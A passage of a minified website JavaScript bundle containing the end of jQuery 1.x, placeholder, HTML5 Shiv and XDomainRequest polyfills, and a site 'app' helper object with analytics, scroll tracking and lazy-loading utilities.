                return p.isFunction(n) && (i = i || o, o = n, n = void 0), p.ajax({
                    url: e,
                    type: t,
                    dataType: i,
                    data: n,
                    success: o
                })
            }
        })), p._evalUrl = function (e) {
            return p.ajax({
                url: e,
                type: "GET",
                dataType: "script",
                async: !1,
                global: !1,
                throws: !0
            })
        }, p.fn.extend({
            wrapAll: function (e) {
                if (p.isFunction(e)) return this.each((function (t) {
                    p(this).wrapAll(e.call(this, t))
                }));
                if (this[0]) {
                    var t = p(e, this[0].ownerDocument).eq(0).clone(!0);
                    this[0].parentNode && t.insertBefore(this[0]), t.map((function () {
                        for (var e = this; e.firstChild && 1 === e.firstChild.nodeType;) e = e.firstChild;
                        return e
                    })).append(this)
                }
                return this
            },
            wrapInner: function (e) {
                return this.each(p.isFunction(e) ? function (t) {
                    p(this).wrapInner(e.call(this, t))
                } : function () {
                    var t = p(this),
                        n = t.contents();
                    n.length ? n.wrapAll(e) : t.append(e)
                })
            },
            wrap: function (e) {
                var t = p.isFunction(e);
                return this.each((function (n) {
                    p(this).wrapAll(t ? e.call(this, n) : e)
                }))
            },
            unwrap: function () {
                return this.parent().each((function () {
                    p.nodeName(this, "body") || p(this).replaceWith(this.childNodes)
                })).end()
            }
        }), p.expr.filters.hidden = function (e) {
            return e.offsetWidth <= 0 && e.offsetHeight <= 0 || !u.reliableHiddenOffsets() && "none" === (e.style && e.style.display || p.css(e, "display"))
        }, p.expr.filters.visible = function (e) {
            return !p.expr.filters.hidden(e)
        };
        var Mt = /%20/g,
            Pt = /\[\]$/,
            jt = /\r?\n/g,
            Bt = /^(?:submit|button|image|reset|file)$/i,
            Ot = /^(?:input|select|textarea|keygen)/i;

        function Ht(e, t, n, o) {
            var i;
            if (p.isArray(t)) p.each(t, (function (t, i) {
                n || Pt.test(e) ? o(e, i) : Ht(e + "[" + ("object" == typeof i ? t : "") + "]", i, n, o)
            }));
            else if (n || "object" !== p.type(t)) o(e, t);
            else
                for (i in t) Ht(e + "[" + i + "]", t[i], n, o)
        }
        p.param = function (e, t) {
            var n, o = [],
                i = function (e, t) {
                    t = p.isFunction(t) ? t() : null == t ? "" : t, o[o.length] = encodeURIComponent(e) + "=" + encodeURIComponent(t)
                };
            if (void 0 === t && (t = p.ajaxSettings && p.ajaxSettings.traditional), p.isArray(e) || e.jquery && !p.isPlainObject(e)) p.each(e, (function () {
                i(this.name, this.value)
            }));
            else
                for (n in e) Ht(n, e[n], t, i);
            return o.join("&").replace(Mt, "+")
        }, p.fn.extend({
            serialize: function () {
                return p.param(this.serializeArray())
            },
            serializeArray: function () {
                return this.map((function () {
                    var e = p.prop(this, "elements");
                    return e ? p.makeArray(e) : this
                })).filter((function () {
                    var e = this.type;
                    return this.name && !p(this).is(":disabled") && Ot.test(this.nodeName) && !Bt.test(e) && (this.checked || !X.test(e))
                })).map((function (e, t) {
                    var n = p(this).val();
                    return null == n ? null : p.isArray(n) ? p.map(n, (function (e) {
                        return {
                            name: t.name,
                            value: e.replace(jt, "\r\n")
                        }
                    })) : {
                        name: t.name,
                        value: n.replace(jt, "\r\n")
                    }
                })).get()
            }
        }), p.ajaxSettings.xhr = void 0 !== e.ActiveXObject ? function () {
            return !this.isLocal && /^(get|post|head|put|delete|options)$/i.test(this.type) && Wt() || function () {
                try {
                    return new e.ActiveXObject("Microsoft.XMLHTTP")
                } catch (e) { }
            }()
        } : Wt;
        var Ft = 0,
            zt = {},
            qt = p.ajaxSettings.xhr();

        function Wt() {
            try {
                return new e.XMLHttpRequest
            } catch (e) { }
        }
        e.attachEvent && e.attachEvent("onunload", (function () {
            for (var e in zt) zt[e](void 0, !0)
        })), u.cors = !!qt && "withCredentials" in qt, (qt = u.ajax = !!qt) && p.ajaxTransport((function (e) {
            var t;
            if (!e.crossDomain || u.cors) return {
                send: function (n, o) {
                    var i, r = e.xhr(),
                        a = ++Ft;
                    if (r.open(e.type, e.url, e.async, e.username, e.password), e.xhrFields)
                        for (i in e.xhrFields) r[i] = e.xhrFields[i];
                    for (i in e.mimeType && r.overrideMimeType && r.overrideMimeType(e.mimeType), e.crossDomain || n["X-Requested-With"] || (n["X-Requested-With"] = "XMLHttpRequest"), n) void 0 !== n[i] && r.setRequestHeader(i, n[i] + "");
                    r.send(e.hasContent && e.data || null), t = function (n, i) {
                        var s, l, c;
                        if (t && (i || 4 === r.readyState))
                            if (delete zt[a], t = void 0, r.onreadystatechange = p.noop, i) 4 !== r.readyState && r.abort();
                            else {
                                c = {}, s = r.status, "string" == typeof r.responseText && (c.text = r.responseText);
                                try {
                                    l = r.statusText
                                } catch (e) {
                                    l = ""
                                }
                                s || !e.isLocal || e.crossDomain ? 1223 === s && (s = 204) : s = c.text ? 200 : 404
                            } c && o(s, l, c, r.getAllResponseHeaders())
                    }, e.async ? 4 === r.readyState ? setTimeout(t) : r.onreadystatechange = zt[a] = t : t()
                },
                abort: function () {
                    t && t(void 0, !0)
                }
            }
        })), p.ajaxSetup({
            accepts: {
                script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
            },
            contents: {
                script: /(?:java|ecma)script/
            },
            converters: {
                "text script": function (e) {
                    return p.globalEval(e), e
                }
            }
        }), p.ajaxPrefilter("script", (function (e) {
            void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET", e.global = !1)
        })), p.ajaxTransport("script", (function (e) {
            if (e.crossDomain) {
                var t, n = E.head || p("head")[0] || E.documentElement;
                return {
                    send: function (o, i) {
                        (t = E.createElement("script")).async = !0, e.scriptCharset && (t.charset = e.scriptCharset), t.src = e.url, t.onload = t.onreadystatechange = function (e, n) {
                            (n || !t.readyState || /loaded|complete/.test(t.readyState)) && (t.onload = t.onreadystatechange = null, t.parentNode && t.parentNode.removeChild(t), t = null, n || i(200, "success"))
                        }, n.insertBefore(t, n.firstChild)
                    },
                    abort: function () {
                        t && t.onload(void 0, !0)
                    }
                }
            }
        }));
        var Rt = [],
            _t = /(=)\?(?=&|$)|\?\?/;
        p.ajaxSetup({
            jsonp: "callback",
            jsonpCallback: function () {
                var e = Rt.pop() || p.expando + "_" + gt++;
                return this[e] = !0, e
            }
        }), p.ajaxPrefilter("json jsonp", (function (t, n, o) {
            var i, r, a, s = !1 !== t.jsonp && (_t.test(t.url) ? "url" : "string" == typeof t.data && !(t.contentType || "").indexOf("application/x-www-form-urlencoded") && _t.test(t.data) && "data");
            return s || "jsonp" === t.dataTypes[0] ? (i = t.jsonpCallback = p.isFunction(t.jsonpCallback) ? t.jsonpCallback() : t.jsonpCallback, s ? t[s] = t[s].replace(_t, "$1" + i) : !1 !== t.jsonp && (t.url += (vt.test(t.url) ? "&" : "?") + t.jsonp + "=" + i), t.converters["script json"] = function () {
                return a || p.error(i + " was not called"), a[0]
            }, t.dataTypes[0] = "json", r = e[i], e[i] = function () {
                a = arguments
            }, o.always((function () {
                e[i] = r, t[i] && (t.jsonpCallback = n.jsonpCallback, Rt.push(i)), a && p.isFunction(r) && r(a[0]), a = r = void 0
            })), "script") : void 0
        })), p.parseHTML = function (e, t, n) {
            if (!e || "string" != typeof e) return null;
            "boolean" == typeof t && (n = t, t = !1), t = t || E;
            var o = x.exec(e),
                i = !n && [];
            return o ? [t.createElement(o[1])] : (o = p.buildFragment([e], t, i), i && i.length && p(i).remove(), p.merge([], o.childNodes))
        };
        var Ut = p.fn.load;
        p.fn.load = function (e, t, n) {
            if ("string" != typeof e && Ut) return Ut.apply(this, arguments);
            var o, i, r, a = this,
                s = e.indexOf(" ");
            return s >= 0 && (o = p.trim(e.slice(s, e.length)), e = e.slice(0, s)), p.isFunction(t) ? (n = t, t = void 0) : t && "object" == typeof t && (r = "POST"), a.length > 0 && p.ajax({
                url: e,
                type: r,
                dataType: "html",
                data: t
            }).done((function (e) {
                i = arguments, a.html(o ? p("<div>").append(p.parseHTML(e)).find(o) : e)
            })).complete(n && function (e, t) {
                a.each(n, i || [e.responseText, t, e])
            }), this
        }, p.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], (function (e, t) {
            p.fn[t] = function (e) {
                return this.on(t, e)
            }
        })), p.expr.filters.animated = function (e) {
            return p.grep(p.timers, (function (t) {
                return e === t.elem
            })).length
        };
        var Xt = e.document.documentElement;

        function Yt(e) {
            return p.isWindow(e) ? e : 9 === e.nodeType && (e.defaultView || e.parentWindow)
        }
        p.offset = {
            setOffset: function (e, t, n) {
                var o, i, r, a, s, l, c = p.css(e, "position"),
                    u = p(e),
                    d = {};
                "static" === c && (e.style.position = "relative"), s = u.offset(), r = p.css(e, "top"), l = p.css(e, "left"), ("absolute" === c || "fixed" === c) && p.inArray("auto", [r, l]) > -1 ? (a = (o = u.position()).top, i = o.left) : (a = parseFloat(r) || 0, i = parseFloat(l) || 0), p.isFunction(t) && (t = t.call(e, n, s)), null != t.top && (d.top = t.top - s.top + a), null != t.left && (d.left = t.left - s.left + i), "using" in t ? t.using.call(e, d) : u.css(d)
            }
        }, p.fn.extend({
            offset: function (e) {
                if (arguments.length) return void 0 === e ? this : this.each((function (t) {
                    p.offset.setOffset(this, e, t)
                }));
                var t, n, o = {
                    top: 0,
                    left: 0
                },
                    i = this[0],
                    r = i && i.ownerDocument;
                return r ? (t = r.documentElement, p.contains(t, i) ? (typeof i.getBoundingClientRect !== j && (o = i.getBoundingClientRect()), n = Yt(r), {
                    top: o.top + (n.pageYOffset || t.scrollTop) - (t.clientTop || 0),
                    left: o.left + (n.pageXOffset || t.scrollLeft) - (t.clientLeft || 0)
                }) : o) : void 0
            },
            position: function () {
                if (this[0]) {
                    var e, t, n = {
                        top: 0,
                        left: 0
                    },
                        o = this[0];
                    return "fixed" === p.css(o, "position") ? t = o.getBoundingClientRect() : (e = this.offsetParent(), t = this.offset(), p.nodeName(e[0], "html") || (n = e.offset()), n.top += p.css(e[0], "borderTopWidth", !0), n.left += p.css(e[0], "borderLeftWidth", !0)), {
                        top: t.top - n.top - p.css(o, "marginTop", !0),
                        left: t.left - n.left - p.css(o, "marginLeft", !0)
                    }
                }
            },
            offsetParent: function () {
                return this.map((function () {
                    for (var e = this.offsetParent || Xt; e && !p.nodeName(e, "html") && "static" === p.css(e, "position");) e = e.offsetParent;
                    return e || Xt
                }))
            }
        }), p.each({
            scrollLeft: "pageXOffset",
            scrollTop: "pageYOffset"
        }, (function (e, t) {
            var n = /Y/.test(t);
            p.fn[e] = function (o) {
                return U(this, (function (e, o, i) {
                    var r = Yt(e);
                    return void 0 === i ? r ? t in r ? r[t] : r.document.documentElement[o] : e[o] : void (r ? r.scrollTo(n ? p(r).scrollLeft() : i, n ? i : p(r).scrollTop()) : e[o] = i)
                }), e, o, arguments.length, null)
            }
        })), p.each(["top", "left"], (function (e, t) {
            p.cssHooks[t] = Pe(u.pixelPosition, (function (e, n) {
                return n ? (n = Ie(e, t), $e.test(n) ? p(e).position()[t] + "px" : n) : void 0
            }))
        })), p.each({
            Height: "height",
            Width: "width"
        }, (function (e, t) {
            p.each({
                padding: "inner" + e,
                content: t,
                "": "outer" + e
            }, (function (n, o) {
                p.fn[o] = function (o, i) {
                    var r = arguments.length && (n || "boolean" != typeof o),
                        a = n || (!0 === o || !0 === i ? "margin" : "border");
                    return U(this, (function (t, n, o) {
                        var i;
                        return p.isWindow(t) ? t.document.documentElement["client" + e] : 9 === t.nodeType ? (i = t.documentElement, Math.max(t.body["scroll" + e], i["scroll" + e], t.body["offset" + e], i["offset" + e], i["client" + e])) : void 0 === o ? p.css(t, n, a) : p.style(t, n, o, a)
                    }), t, r ? o : void 0, r, null)
                }
            }))
        })), p.fn.size = function () {
            return this.length
        }, p.fn.andSelf = p.fn.addBack, "function" == typeof define && define.amd && define("jquery", [], (function () {
            return p
        }));
        var Vt = e.jQuery,
            Gt = e.$;
        return p.noConflict = function (t) {
            return e.$ === p && (e.$ = Gt), t && e.jQuery === p && (e.jQuery = Vt), p
        }, typeof t === j && (e.jQuery = e.$ = p), p
    })),
    function () {
        for (var e, t = function () { }, n = ["assert", "clear", "count", "debug", "dir", "dirxml", "error", "exception", "group", "groupCollapsed", "groupEnd", "info", "log", "markTimeline", "profile", "profileEnd", "table", "time", "timeEnd", "timeStamp", "trace", "warn"], o = n.length, i = window.console = window.console || {}; o--;) i[e = n[o]] || (i[e] = t)
    }(), console.debug || (console.debug = {}),
    function (e) {
        "function" == typeof define && define.amd ? define(["jquery"], e) : e(jQuery)
    }((function (e) {
        function t(t, n) {
            var i = this,
                r = e(i);
            if (i.value == r.attr("placeholder") && r.hasClass(d.customClass))
                if (r.data("placeholder-password")) {
                    if (r = r.hide().nextAll('input[type="password"]:first').show().attr("id", r.removeAttr("id").data("placeholder-id")), !0 === t) return r[0].value = n;
                    r.focus()
                } else i.value = "", r.removeClass(d.customClass), i == o() && i.select()
        }

        function n() {
            var n, o = this,
                i = e(o),
                r = this.id;
            if ("" === o.value) {
                if ("password" === o.type) {
                    if (!i.data("placeholder-textinput")) {
                        try {
                            n = i.clone().attr({
                                type: "text"
                            })
                        } catch (t) {
                            n = e("<input>").attr(e.extend(function (t) {
                                var n = {},
                                    o = /^jQuery\d+$/;
                                return e.each(t.attributes, (function (e, t) {
                                    t.specified && !o.test(t.name) && (n[t.name] = t.value)
                                })), n
                            }(this), {
                                type: "text"
                            }))
                        }
                        n.removeAttr("name").data({
                            "placeholder-password": i,
                            "placeholder-id": r
                        }).bind("focus.placeholder", t), i.data({
                            "placeholder-textinput": n,
                            "placeholder-id": r
                        }).before(n)
                    }
                    i = i.removeAttr("id").hide().prevAll('input[type="text"]:first').attr("id", r).show()
                }
                i.addClass(d.customClass), i[0].value = i.attr("placeholder")
            } else i.removeClass(d.customClass)
        }

        function o() {
            try {
                return document.activeElement
            } catch (e) { }
        }
        var i, r, a = "[object OperaMini]" == Object.prototype.toString.call(window.operamini),
            s = "placeholder" in document.createElement("input") && !a,
            l = "placeholder" in document.createElement("textarea") && !a,
            c = e.valHooks,
            u = e.propHooks;
        if (s && l) (r = e.fn.placeholder = function () {
            return this
        }).input = r.textarea = !0;
        else {
            var d = {};
            (r = e.fn.placeholder = function (o) {
                d = e.extend({}, {
                    customClass: "placeholder"
                }, o);
                return this.filter((s ? "textarea" : ":input") + "[placeholder]").not("." + d.customClass).bind({
                    "focus.placeholder": t,
                    "blur.placeholder": n
                }).data("placeholder-enabled", !0).trigger("blur.placeholder"), this
            }).input = s, r.textarea = l, i = {
                get: function (t) {
                    var n = e(t),
                        o = n.data("placeholder-password");
                    return o ? o[0].value : n.data("placeholder-enabled") && n.hasClass("placeholder") ? "" : t.value
                },
                set: function (i, r) {
                    var a = e(i),
                        s = a.data("placeholder-password");
                    return s ? s[0].value = r : a.data("placeholder-enabled") ? ("" === r ? (i.value = r, i != o() && n.call(i)) : a.hasClass(d.customClass) && t.call(i, !0, r) || (i.value = r), a) : i.value = r
                }
            }, s || (c.input = i, u.value = i), l || (c.textarea = i, u.value = i), e((function () {
                e(document).delegate("form", "submit.placeholder", (function () {
                    var o = e("." + d.customClass, this).each(t);
                    setTimeout((function () {
                        o.each(n)
                    }), 10)
                }))
            })), e(window).bind("beforeunload.placeholder", (function () {
                e("." + d.customClass).each((function () {
                    this.value = ""
                }))
            }))
        }
    })),
    /*! HTML5 Shiv v3.6 | @afarkas @jdalton @jon_neal @rem | MIT/GPL2 Licensed */
    function (e, t) {
        function n() {
            var e = h.elements;
            return "string" == typeof e ? e.split(" ") : e
        }

        function o(e) {
            var t = f[e[d]];
            return t || (t = {}, p++, e[d] = p, f[p] = t), t
        }

        function i(e, n, i) {
            return n || (n = t), s ? n.createElement(e) : (i || (i = o(n)), (n = i.cache[e] ? i.cache[e].cloneNode() : u.test(e) ? (i.cache[e] = i.createElem(e)).cloneNode() : i.createElem(e)).canHaveChildren && !c.test(e) ? i.frag.appendChild(n) : n)
        }

        function r(e) {
            e || (e = t);
            var r = o(e);
            if (h.shivCSS && !a && !r.hasCSS) {
                var l, c = e;
                l = c.createElement("p"), c = c.getElementsByTagName("head")[0] || c.documentElement, l.innerHTML = "x<style>article,aside,figcaption,figure,footer,header,hgroup,nav,section{display:block}mark{background:#FF0;color:#000}</style>", l = c.insertBefore(l.lastChild, c.firstChild), r.hasCSS = !!l
            }
            return s || function (e, t) {
                t.cache || (t.cache = {}, t.createElem = e.createElement, t.createFrag = e.createDocumentFragment, t.frag = t.createFrag()), e.createElement = function (n) {
                    return h.shivMethods ? i(n, e, t) : t.createElem(n)
                }, e.createDocumentFragment = Function("h,f", "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(" + n().join().replace(/\w+/g, (function (e) {
                    return t.createElem(e), t.frag.createElement(e), 'c("' + e + '")'
                })) + ");return n}")(h, t.frag)
            }(e, r), e
        }
        var a, s, l = e.html5 || {},
            c = /^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,
            u = /^<|^(?:a|b|button|code|div|fieldset|form|h1|h2|h3|h4|h5|h6|i|iframe|img|input|label|li|link|ol|option|p|param|q|script|select|span|strong|style|table|tbody|td|textarea|tfoot|th|thead|tr|ul)$/i,
            d = "_html5shiv",
            p = 0,
            f = {};
        ! function () {
            try {
                var e, n = t.createElement("a");
                if (n.innerHTML = "<xyz></xyz>", a = "hidden" in n, !(e = 1 == n.childNodes.length)) {
                    t.createElement("a");
                    var o = t.createDocumentFragment();
                    e = void 0 === o.cloneNode || void 0 === o.createDocumentFragment || void 0 === o.createElement
                }
                s = e
            } catch (e) {
                s = a = !0
            }
        }();
        var h = {
            elements: l.elements || "abbr article aside audio bdi canvas data datalist details figcaption figure footer header hgroup mark meter nav output progress section summary time video",
            shivCSS: !1 !== l.shivCSS,
            supportsUnknownElements: s,
            shivMethods: !1 !== l.shivMethods,
            type: "default",
            shivDocument: r,
            createElement: i,
            createDocumentFragment: function (e, i) {
                if (e || (e = t), s) return e.createDocumentFragment();
                for (var r = (i = i || o(e)).frag.cloneNode(), a = 0, l = n(), c = l.length; a < c; a++) r.createElement(l[a]);
                return r
            }
        };
        e.html5 = h, r(t)
    }(this, document),
    function () {
        for (var e = 0, t = ["ms", "moz", "webkit", "o"], n = 0; n < t.length && !window.requestAnimationFrame; ++n) window.requestAnimationFrame = window[t[n] + "RequestAnimationFrame"], window.cancelAnimationFrame = window[t[n] + "CancelAnimationFrame"] || window[t[n] + "CancelRequestAnimationFrame"];
        window.requestAnimationFrame || (window.requestAnimationFrame = function (t, n) {
            var o = (new Date).getTime(),
                i = Math.max(0, 4 - (o - e)),
                r = window.setTimeout((function () {
                    t(o + i)
                }), 1);
            return e = o + i, r
        }), window.cancelAnimationFrame || (window.cancelAnimationFrame = function (e) {
            clearTimeout(e)
        })
    }(), Array.prototype.indexOf || (Array.prototype.indexOf = function (e, t) {
        for (var n = t || 0, o = this.length; n < o; n++)
            if (this[n] === e) return n;
        return -1
    }),
    /*!
     * jQuery-ajaxTransport-XDomainRequest - v1.0.3 - 2014-06-06
     * https://github.com/MoonScript/jQuery-ajaxTransport-XDomainRequest
     * Copyright (c) 2014 Jason Moon (@JSONMOON)
     * Licensed MIT (/blob/master/LICENSE.txt)
     */
    function (e) {
        "function" == typeof define && define.amd ? define(["jquery"], e) : "object" == typeof exports ? module.exports = e(require("jquery")) : e(jQuery)
    }((function (e) {
        if (!e.support.cors && e.ajaxTransport && window.XDomainRequest) {
            console.log("going to set up the transport");
            var t = /^https?:\/\//i,
                n = /^get|post$/i,
                o = new RegExp("^" + location.protocol, "i");
            e.ajaxTransport("* text html xml json", (function (i, r, a) {
                if (i.crossDomain && i.async && n.test(i.type) && t.test(i.url) && o.test(i.url)) {
                    var s = null;
                    return {
                        send: function (t, n) {
                            var o = "",
                                a = (r.dataType || "").toLowerCase();
                            s = new XDomainRequest, /^\d+$/.test(r.timeout) && (s.timeout = r.timeout), s.ontimeout = function () {
                                n(500, "timeout")
                            }, s.onload = function () {
                                var t = "Content-Length: " + s.responseText.length + "\r\nContent-Type: " + s.contentType,
                                    o = {
                                        code: 200,
                                        message: "success"
                                    },
                                    i = {
                                        text: s.responseText
                                    };
                                try {
                                    if ("html" === a || /text\/html/i.test(s.contentType)) i.html = s.responseText;
                                    else if ("json" === a || "text" !== a && /\/json/i.test(s.contentType)) try {
                                        i.json = e.parseJSON(s.responseText)
                                    } catch (e) {
                                        o.code = 500, o.message = "parseerror"
                                    } else if ("xml" === a || "text" !== a && /\/xml/i.test(s.contentType)) {
                                        var r = new ActiveXObject("Microsoft.XMLDOM");
                                        r.async = !1;
                                        try {
                                            r.loadXML(s.responseText)
                                        } catch (e) {
                                            r = void 0
                                        }
                                        if (!r || !r.documentElement || r.getElementsByTagName("parsererror").length) throw o.code = 500, o.message = "parseerror", "Invalid XML: " + s.responseText;
                                        i.xml = r
                                    }
                                } catch (e) {
                                    throw e
                                } finally {
                                    n(o.code, o.message, i, t)
                                }
                            }, s.onprogress = function () { }, s.onerror = function () {
                                n(500, "error", {
                                    text: s.responseText
                                })
                            }, r.data && (o = "string" === e.type(r.data) ? r.data : e.param(r.data)), s.open(i.type, i.url), s.send(o)
                        },
                        abort: function () {
                            s && s.abort()
                        }
                    }
                }
            }))
        }
    })), window.dataLayer = window.dataLayer || [];
var app = {
    actionCallbacks: {},
    actionsCalled: [],
    addLeadingZero: function (e) {
        return e < 10 ? "0" + e : e
    },
    addSettings: function (e, t) {
        return app.settings[e] ? (console.log("Settings already exist for: " + e), !1) : (app.settings[e] = t, app.settings[e])
    },
    addState: function (e, t) {
        return app.state[e] ? (console.log("State already exists for: " + e), !1) : (app.state[e] = t, app.state[e])
    },
    checkPersonalEmail: function (e) {
        var t = !1;
        return e.match(/yahoo\.com|gmail\.com|hotmail\.com|outlook\.com|aol\.com|inbox\.com|live\.com|msn\.com/gi) && (t = !0), t
    },
    checkIP: function () {
        var e = $("#in-pro");
        if (e.length) {
            var t = e.attr("data-val");
            app.store.userIP = t.replace(/-/g, "."), app.store.userAgent = navigator.userAgent
        }
    },
    checkMobile: function () {
        app.vars.isMobile = app.vars.windowWidth < 900, app.vars.isTablet = app.vars.windowWidth <= app.vars.mobileMaxWidth
    },
    class: {},
    create: function (e, t) {
        var n = document.createElement(e);
        return n.className = t || "", n
    },
    curry: function (e, t) {
        var n = Array.prototype.slice.call(arguments, 0);
        return void 0 === t && (n[1] = e.length), t === n.length - 2 ? e.apply(void 0, n.slice(2)) : function () {
            return app.curry.apply(void 0, n.concat(Array.prototype.slice.call(arguments, 0)))
        }
    },
    each: function (e, t) {
        if (e instanceof Array || e instanceof jQuery)
            for (var n = 0, o = e.length; n < o; n++) t.call(e[n]);
        else
            for (var i in e) e.hasOwnProperty(i) && t.call(e[i])
    },
    el: {
        $window: $(window),
        $centeringOverlay: $("#centering-overlay")
    },
    extend: function (e, t) {
        var n = e;
        for (key in t) e.hasOwnProperty(key), n[key] = t[key];
        return n
    },
    get: {
        class: function (e, t) {
            return (t || document).getElementsByClassName(e)
        },
        id: function (e, t) {
            return (t || document).getElementById(e)
        }
    },
    getPageX: function (e) {
        return app.vars.touchEnabled ? e.touches[0].pageX : e.pageX
    },
    getPageY: function (e) {
        return app.vars.touchEnabled ? e.touches[0].pageY : e.pageY
    },
    hasCapture: function () {
        return navigator.getUserMedia = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia, !(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia)
    },
    help: {},
    init: function () {
        app.fn.matchHeights(), $(window).on("load", (function () {
            app.setFooterOffsetTop(), app.fn.stickyInit()
        })), app.fn.tabsInit(), app.fn.createResourceFilters(), app.fn.setupCountryAndStateDropdowns(), app.listenToWindow()
    },
    isMobile: function () {
        return /iPhone|iPod|Android/i.test(navigator.userAgent)
    },
    isSet: function (e) {
        return !(!e || void 0 === e || !e)
    },
    on: function (e, t) {
        var n = this;
        n.actionCallbacks[e] || (n.actionCallbacks[e] = []), n.actionCallbacks[e].push(t)
    },
    onOnce: function (e, t) {
        var n = this; - 1 != n.actionsCalled.indexOf(e) ? t.apply(n) : (n.actionCallbacks[e] || (n.actionCallbacks[e] = []), n.actionCallbacks[e].push(t))
    },
    listenToWindow: function () {
        var e, t, n, o = this,
            i = 0;
        app.store.userMaximumScroll = 0, e = document.documentElement, t = 0, (n = $(window)).on("resize", (function () {
            var e;
            t++, e = t, setTimeout((function () {
                e == t && (app.vars.footerOffsetTop = $("footer").length > 0 ? $("footer").offset().top : 0, app.setFooterOffsetTop(), app.vars.windowWidth = window.outerWidth, app.vars.windowHeight = $(window).height(), app.checkMobile(), o.notify("windowResized"))
            }), 300)
        })), n.on("load", (function () {
            o.notify("windowLoaded"), window.dataLayer.push({
                event: "FTI Custom Event",
                "FTI-CustomEventAction": "Site Version",
                "FTI-CustomEventLabel": "New D8"
            })
        })),
            function t() {
                o.vars.windowScrollTop = (window.pageYOffset || e.scrollTop) - (e.clientTop || 0);
                var n = o.vars.windowScrollTop;
                if (n === i);
                else {
                    if (o.notify("scroll"), n > app.store.windowScrollCurrentMax + 500) {
                        app.store.windowScrollCurrentMax += 500;
                        var r = document.title;
                        window.dataLayer.push({
                            event: "Scrolled",
                            distance: n,
                            title: r
                        })
                    }
                    n > 100 ? n < i ? o.notify("scrollingUp") : n != i && o.notify("scrollingDown") : o.notify("scrollingNearTop"), i = n, n > app.store.userMaximumScroll && (app.store.userMaximumScroll = n)
                }
                window.requestAnimationFrame(t)
            }()
    },
    make: function (e, t) {
        if ("text" == e) var n = document.createTextNode(t);
        else {
            n = document.createElement(e);
            t && (n.className = t)
        }
        return n
    },
    notify: function (e, t) {
        var n = this;
        n.actionsCalled.push(e), t || (t = []), n.actionCallbacks[e] && app.each(n.actionCallbacks[e], (function () {
            this.apply(n, t)
        }))
    },
    removeLeadingZerosFromDate: function (e) {
        var t = new Date(e),
            n = t.getFullYear() + "";
        return !!t && t.getMonth() + 1 + "/" + t.getDate() + "/" + n.substr(-2, 2)
    },
    round: function (e) {
        const t = 1 * e;
        return Math.round(100 * (t + Number.EPSILON)) / 100
    },
    setFooterOffsetTop: function () {
        $(".solutions-get-in-touch").length ? app.vars.footerOffsetTop = $(".solutions-get-in-touch").offset().top : app.vars.footerOffsetTop = this.vars.$footer && this.vars.$footer.length ? this.vars.$footer.offset().top : 0
    },
    setSwipeVars: function () {
        this.vars.touchEnabled && (this.vars.swipeEnd += " touchend", this.vars.swipeMove += " touchmove", this.vars.swipeStart += " touchstart", this.vars.hoverStart = "touchstart", this.vars.hoverMove = "touchmove", this.vars.hoverEnd = "touchend")
    },
    settings: {},
    sortBy: function (e, t, n) {
        var o = function (t) {
            return n ? n(t[e]) : t[e]
        };
        return function (e, n) {
            var i = o(e),
                r = o(n);
            return (i < r ? -1 : i > r ? 1 : 0) * [-1, 1][+!!t]
        }
    },
    state: {},
    store: {},
    storePut: function (e, t) {
        window.localStorage && localStorage.setItem(e, t)
    },
    storeGet: function (e) {
        if (window.localStorage) return localStorage.getItem(e)
    },
    toTitleCase: function (e) {
        for (var t = e.toLowerCase().split(" "), n = 0; n < t.length; n++) {
            var o = t[n];
            t[n] = o.charAt(0).toUpperCase() + o.substr(1).toLowerCase()
        }
        return t = t.join(" ")
    },
    vars: {
        hoverStart: "mouseenter",
        hoverMove: "mousemove",
        hoverEnd: "mouseleave",
        footerOffsetTop: 700,
        isMobile: !1,
        isTablet: !1,
        tabGroupInstances: {},
        touchEnabled: "ontouchend" in document,
        stickyArray: [],
        swipeStart: "mousedown",
        swipeMove: "mousemove",
        swipeEnd: "mouseup",
        windowScrollTop: 0,
        windowWidth: window.outerWidth,
        windowHeight: window.outerHeight
    }
};
app.checkMobile(), app.checkIP(), app.setSwipeVars(), app.const = {
    gaussMatrix: [
        [.0121, .0261, .0337, .0261, .0121],
        [.0261, .0561, .0724, .0561, .0261],
        [.0337, .0724, .0935, .0724, .0337],
        [.0261, .0561, .0724, .0561, .0261],
        [.0121, .0261, .0337, .0261, .0121]
    ],
    numRequiredCardAttributes: 6
}, app.class.InputWrapper = function (e) {
    this.actionCallbacks = {}, this.actionsCalled = [], this.$element = e, this.$inputs = this.$element.find(":input"), this.listenYes()
}, app.class.InputWrapper.prototype = {
    listenYes: function () {
        var e = this;
        e.$inputs.each((function () {
            let t = $(this);
            t.on("input", (function () {
                app.isSet(t.val()) ? e.$element.addClass("has-value") : e.$element.removeClass("has-value")
            }))
        }))
    },
    notify: function (e, t) {
        var n = this;
        n.actionsCalled.push(e), t || (t = []), n.actionCallbacks[e] && app.each(n.actionCallbacks[e], (function () {
            console.log(JSON.stringify(n.actionCallbacks)), this.apply(n, t)
        }))
    },
    on: function (e, t) {
        var n = this;
        n.actionCallbacks[e] || (n.actionCallbacks[e] = []), n.actionCallbacks[e].push(t)
    }
}, app.class.LazyLoad = function (e) {
    this.$element = $(e), this.$element.length && (this.src = this.$element.attr("data-src"), this.src && (this.$distanceElement = this.$element, this.$element.hasClass("masked") && (this.$distanceElement = this.$element.parent()), this.distanceBelowBottomOfScreen = this.$distanceElement.offset().top - app.vars.windowHeight - 500, this.isLoaded = !1, this.listenYes(), this.checkPosition()))
}, app.class.LazyLoad.prototype = {
    addImageSource: function () {
        var e = this;
        e.$element.attr("src", e.src), e.isLoaded = !0
    },
    checkPosition: function () {
        var e = this;
        e.isLoaded || (e.distanceBelowBottomOfScreen < 0 || app.vars.windowScrollTop >= e.distanceBelowBottomOfScreen) && e.addImageSource()
    },
    listenNo: function () { },
    listenYes: function () {
        var e = this;
        app.on("scroll", (function () {
            e.checkPosition()
        }))
    }
}, app.class.Promise = function (e, t) {
    return this.callbacks = [], this.complete = !1, this.errorCallbacks = [], this.errored = !1, this.name = t || "none", this.returnPromise = !1, !!e && e instanceof app.class.Promise ? e : this
}, app.class.Promise.prototype = {
